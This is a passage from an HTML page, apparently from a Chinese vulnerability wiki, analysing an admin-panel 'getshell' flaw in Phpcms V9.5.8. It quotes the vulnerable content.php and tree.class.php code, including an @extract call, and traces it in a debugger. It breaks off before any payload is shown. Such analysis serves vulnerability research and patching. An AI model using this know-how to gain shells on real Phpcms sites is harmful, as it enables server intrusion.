@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Phpcms/Phpcms%20V9.5.8%20%E5%90%8E%E5%8F%B0getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Phpcms V9.5.8 后台getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Phpcms V9.5.8 \u540e\u53f0getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20V9.6.0%20authkey%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20V9.6.0%20authkey%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Phpcms V9.6.0 authkey泄露导致注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../PhpYun/Phpyun%20v5.0.1%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../PhpYun/Phpyun%20v5.0.1%20%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Phpyun v5.0.1 后台getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpcms-v958-getshell">Phpcms V9.5.8 后台getshell<a class="headerlink" href="#phpcms-v958-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Phpcms V9.5.8</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>代码位于<code>/phpcms/modules/content/content.php</code> 第472-532行</p>
+<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">public_categorys</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">$</span><span class="n">show_header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="o">$</span><span class="n">cfg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getcache</span><span class="p">(</span><span class="s1">&#39;common&#39;</span><span class="p">,</span><span class="s1">&#39;commons&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">ajax_show</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intval</span><span class="p">(</span><span class="o">$</span><span class="n">cfg</span><span class="p">[</span><span class="s1">&#39;category_ajax&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">from</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">in_array</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">],</span><span class="n">array</span><span class="p">(</span><span class="s1">&#39;block&#39;</span><span class="p">))</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;content&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="o">$</span><span class="n">tree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pc_base</span><span class="p">::</span><span class="n">load_sys_class</span><span class="p">(</span><span class="s1">&#39;tree&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">from</span><span class="o">==</span><span class="s1">&#39;content&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">&#39;roleid&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">priv_db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pc_base</span><span class="p">::</span><span class="n">load_model</span><span class="p">(</span><span class="s1">&#39;category_priv_model&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">priv_result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">priv_db</span><span class="o">-&gt;</span><span class="n">select</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;init&#39;</span><span class="p">,</span><span class="s1">&#39;roleid&#39;</span><span class="o">=&gt;$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">&#39;roleid&#39;</span><span class="p">],</span><span class="s1">&#39;siteid&#39;</span><span class="o">=&gt;$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">siteid</span><span class="p">,</span><span class="s1">&#39;is_admin&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">));</span>
+<span class="w">        </span><span class="o">$</span><span class="n">priv_catids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+<span class="w">        </span><span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">priv_result</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">_v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">priv_catids</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">_v</span><span class="p">[</span><span class="s1">&#39;catid&#39;</span><span class="p">];</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">priv_catids</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="o">$</span><span class="n">categorys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">categorys</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">categorys</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;siteid&#39;</span><span class="p">]</span><span class="o">!=$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">siteid</span><span class="w"> </span><span class="o">||</span><span class="w">  </span><span class="p">(</span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="mi">2</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;child&#39;</span><span class="p">]</span><span class="o">==</span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">from</span><span class="o">==</span><span class="s1">&#39;content&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">&#39;roleid&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">in_array</span><span class="p">(</span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;catid&#39;</span><span class="p">],</span><span class="o">$</span><span class="n">priv_catids</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">arrchildid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;arrchildid&#39;</span><span class="p">]);</span>
+<span class="w">                </span><span class="o">$</span><span class="n">array_intersect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array_intersect</span><span class="p">(</span><span class="o">$</span><span class="n">priv_catids</span><span class="p">,</span><span class="o">$</span><span class="n">arrchildid</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">array_intersect</span><span class="p">))</span><span class="w"> </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="mi">1</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">$</span><span class="n">from</span><span class="o">==</span><span class="s1">&#39;block&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;vs_show&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;</span><span class="o">.$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;menuid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;catid=&quot;</span><span class="o">.$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;catid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;type=show&#39; target=&#39;right&#39;&gt;[&quot;</span><span class="o">.</span><span class="n">L</span><span class="p">(</span><span class="s1">&#39;content_page&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;]&lt;/a&gt;&quot;</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;vs_show&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;icon_type&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;file&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;add_icon&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;add&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;icon_type&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;vs_show&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;init&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;add_icon&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;a target=&#39;right&#39; href=&#39;?m=content&amp;c=content&amp;menuid=&quot;</span><span class="o">.$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;menuid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;catid=&quot;</span><span class="o">.$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;catid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39; onclick=javascript:openwinx(&#39;?m=content&amp;c=content&amp;a=add&amp;menuid=&quot;</span><span class="o">.$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;menuid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;catid=&quot;</span><span class="o">.$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;catid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;hash_page=&quot;</span><span class="o">.$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">&#39;hash_page&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;,&#39;&#39;)&gt;&lt;img src=&#39;&quot;</span><span class="o">.</span><span class="n">IMG_PATH</span><span class="o">.</span><span class="s2">&quot;add_content.gif&#39; alt=&#39;&quot;</span><span class="o">.</span><span class="n">L</span><span class="p">(</span><span class="s1">&#39;add&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&gt;&lt;/a&gt; &quot;</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="o">$</span><span class="n">categorys</span><span class="p">[</span><span class="o">$</span><span class="n">r</span><span class="p">[</span><span class="s1">&#39;catid&#39;</span><span class="p">]]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">r</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">empty</span><span class="p">(</span><span class="o">$</span><span class="n">categorys</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">$</span><span class="n">tree</span><span class="o">-&gt;</span><span class="n">init</span><span class="p">(</span><span class="o">$</span><span class="n">categorys</span><span class="p">);</span>
+<span class="w">            </span><span class="n">switch</span><span class="p">(</span><span class="o">$</span><span class="n">from</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">case</span><span class="w"> </span><span class="s1">&#39;block&#39;</span><span class="p">:</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">strs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;span class=&#39;\$icon_type&#39;&gt;\$add_icon&lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;</span><span class="o">.$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;menuid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;catid=\$catid&amp;type=list&#39; target=&#39;right&#39;&gt;\$catname&lt;/a&gt; \$vs_show&lt;/span&gt;&quot;</span><span class="p">;</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">strs2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;img src=&#39;&quot;</span><span class="o">.</span><span class="n">IMG_PATH</span><span class="o">.</span><span class="s2">&quot;folder.gif&#39;&gt; &lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;</span><span class="o">.$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;menuid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;catid=\$catid&amp;type=category&#39; target=&#39;right&#39;&gt;\$catname&lt;/a&gt;&quot;</span><span class="p">;</span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">                </span><span class="n">default</span><span class="p">:</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">strs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;span class=&#39;\$icon_type&#39;&gt;\$add_icon&lt;a href=&#39;?m=content&amp;c=content&amp;a=\$type&amp;menuid=&quot;</span><span class="o">.$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;menuid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;catid=\$catid&#39; target=&#39;right&#39; onclick=&#39;open_list(this)&#39;&gt;\$catname&lt;/a&gt;&lt;/span&gt;&quot;</span><span class="p">;</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">strs2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;span class=&#39;folder&#39;&gt;\$catname&lt;/span&gt;&quot;</span><span class="p">;</span>
+<span class="w">                    </span><span class="k">break</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="o">$</span><span class="n">categorys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">tree</span><span class="o">-&gt;</span><span class="n">get_treeview</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;category_tree&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">strs</span><span class="p">,</span><span class="o">$</span><span class="n">strs2</span><span class="p">,</span><span class="o">$</span><span class="n">ajax_show</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">$</span><span class="n">categorys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">L</span><span class="p">(</span><span class="s1">&#39;please_add_category&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">include</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">admin_tpl</span><span class="p">(</span><span class="s1">&#39;category_tree&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">exit</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>复制 文本</p>
+<p>在当前函数开始下个断点</p>
+<p><img alt="1.png" src="../resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId25.png" /><img alt="2.png" src="../resource/PhpcmsV9.5.8%E5%90%8E%E5%8F%B0getshell/media/rId26.png" /></p>
+<p>跟到526行：</p>
+<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="n">categorys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">tree</span><span class="o">-&gt;</span><span class="n">get_treeview</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">&#39;category_tree&#39;</span><span class="p">,</span><span class="err">$</span><span class="n">strs</span><span class="p">,</span><span class="err">$</span><span class="n">strs2</span><span class="p">,</span><span class="err">$</span><span class="n">ajax_show</span><span class="p">);</span>
+</code></pre></div>
+
+<p>复制 文本</p>
+<p>进入了<code>get_treeview()</code>函数，跟入进去，</p>
+<p>函数位于 <code>/phpcms/libs/classes/tree.class.php</code> 第206-239行。</p>
+<div class="codehilite"><pre><span></span><code><span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">$myid</span><span class="w"> </span><span class="n">表示获得这个ID下的所有子级</span>
+<span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">$effected_id</span><span class="w"> </span><span class="n">需要生成treeview目录数的id</span>
+<span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">$str</span><span class="w"> </span><span class="n">末级样式</span>
+<span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">$str2</span><span class="w"> </span><span class="n">目录级别样式</span>
+<span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">$showlevel</span><span class="w"> </span><span class="n">直接显示层级数</span><span class="err">，</span><span class="n">其余为异步显示</span><span class="err">，</span><span class="mi">0</span><span class="n">为全部限制</span>
+<span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">$style</span><span class="w"> </span><span class="n">目录样式</span><span class="w"> </span><span class="n">默认</span><span class="w"> </span><span class="n">filetree</span><span class="w"> </span><span class="n">可增加其他样式如</span><span class="err">&#39;</span><span class="n">filetree</span><span class="w"> </span><span class="n">treeview</span><span class="o">-</span><span class="n">famfamfam</span><span class="err">&#39;</span>
+<span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">$currentlevel</span><span class="w"> </span><span class="n">计算当前层级</span><span class="err">，</span><span class="n">递归使用</span><span class="w"> </span><span class="n">适用改函数时不需要用该参数</span>
+<span class="o">*</span><span class="w"> </span><span class="p">@</span><span class="n">param</span><span class="w"> </span><span class="n">$recursion</span><span class="w"> </span><span class="n">递归使用</span><span class="w"> </span><span class="n">外部调用时为FALSE</span>
+<span class="n">function</span><span class="w"> </span><span class="n">get_treeview</span><span class="p">(</span><span class="n">$myid</span><span class="p">,</span><span class="n">$effected_id</span><span class="o">=</span><span class="err">&#39;</span><span class="n">example</span><span class="err">&#39;</span><span class="p">,</span><span class="n">$str</span><span class="o">=</span><span class="s">&quot;&lt;span class=&#39;file&#39;&gt;\$name&lt;/span&gt;&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">$str2</span><span class="o">=</span><span class="s">&quot;&lt;span class=&#39;folder&#39;&gt;\$name&lt;/span&gt;&quot;</span><span class="w"> </span><span class="p">,</span><span class="n">$showlevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">,</span><span class="n">$style</span><span class="o">=</span><span class="err">&#39;</span><span class="n">filetree</span><span class="w"> </span><span class="err">&#39;</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">$currentlevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">$recursion</span><span class="o">=</span><span class="nb">FALSE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">$child</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">get_child</span><span class="p">(</span><span class="n">$myid</span><span class="p">);</span>
+<span class="w">     </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="err">&#39;</span><span class="n">EFFECTED_INIT</span><span class="err">&#39;</span><span class="p">)){</span>
+<span class="w">        </span><span class="n">$effected</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="w"> </span><span class="kt">id</span><span class="o">=</span><span class="s">&quot;&#39;.$effected_id.&#39;&quot;</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">define</span><span class="p">(</span><span class="err">&#39;</span><span class="n">EFFECTED_INIT</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">     </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">$effected</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">;</span>
+<span class="w">     </span><span class="p">}</span>
+<span class="w">     </span><span class="n">$placeholder</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="err">&#39;</span><span class="o">&lt;</span><span class="n">ul</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">span</span><span class="w"> </span><span class="k">class</span><span class="o">=</span><span class="s">&quot;placeholder&quot;</span><span class="o">&gt;&lt;/</span><span class="n">span</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">ul</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">     </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">$recursion</span><span class="p">)</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">str</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="err">&#39;</span><span class="o">&lt;</span><span class="n">ul</span><span class="err">&#39;</span><span class="p">.</span><span class="n">$effected</span><span class="p">.</span><span class="err">&#39;</span><span class="w">  </span><span class="k">class</span><span class="o">=</span><span class="s">&quot;&#39;.$style.&#39;&quot;</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">     </span><span class="n">foreach</span><span class="p">(</span><span class="n">$child</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">$id</span><span class="o">=&gt;</span><span class="n">$a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">         </span><span class="p">@</span><span class="n">extract</span><span class="p">(</span><span class="n">$a</span><span class="p">);</span>
+<span class="w">         </span><span class="k">if</span><span class="p">(</span><span class="n">$showlevel</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">$showlevel</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">$currentlevel</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">$this</span><span class="o">-&gt;</span><span class="n">get_child</span><span class="p">(</span><span class="n">$id</span><span class="p">))</span><span class="w"> </span><span class="n">$folder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">hasChildren</span><span class="err">&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">//如设置显示层级模式@2011.07.01</span>
